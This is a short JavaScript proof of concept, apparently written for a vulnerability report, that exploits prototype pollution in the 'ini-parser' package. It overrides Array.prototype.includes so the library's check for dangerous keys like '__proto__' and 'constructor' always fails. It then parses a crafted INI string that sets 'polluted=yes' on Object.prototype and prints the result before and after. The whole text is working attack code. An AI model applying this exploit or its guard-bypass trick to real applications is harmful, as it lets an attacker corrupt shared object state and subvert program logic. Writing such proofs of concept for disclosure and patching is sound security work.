Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
let a = require('ini-parser');
a.parse('[constructor][prototype]\npolluted=yes');
console.log({}.polluted);